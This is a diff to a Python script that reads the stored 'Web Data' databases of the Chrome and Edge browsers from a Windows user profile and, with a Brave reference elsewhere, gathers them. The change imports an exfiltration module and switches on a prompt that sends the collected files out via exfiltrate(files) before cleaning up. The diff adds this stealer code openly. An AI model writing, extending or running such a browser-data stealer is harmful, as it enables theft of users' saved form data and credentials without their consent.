@@ -4,6 +4,7 @@ import csv
 import os
 import subprocess
 from pathlib import Path
+from exfiltration import exfiltrate
 
 CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Default\Web Data"%(os.environ['USERPROFILE']))
 EDGE_PATH = os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data\Default\Web Data"%(os.environ['USERPROFILE']))
@@ -81,13 +82,11 @@ get_info("Brave","brave.exe",BRAVE_PATH)
 print('\n')
 info.close()
 
-cleanup(files)
+exfil = input("[?] Do you want to exfiltrate data: Y/N? ")
+if exfil.upper() == "N":
+    print("[!] Goodbye!")
+    sys.exit()
 
-#exfil = input("[?] Do you want to exfiltrate data: Y/N? ")
-#if exfil.upper() == "N":
-#    print("[!] Goodbye!")
-#    sys.exit()
-#
-#elif exfil.upper() == "Y":
-#    exfiltrate(files)
-#    cleanup(files)
+elif exfil.upper() == "Y":
+    exfiltrate(files)
+    cleanup(files)
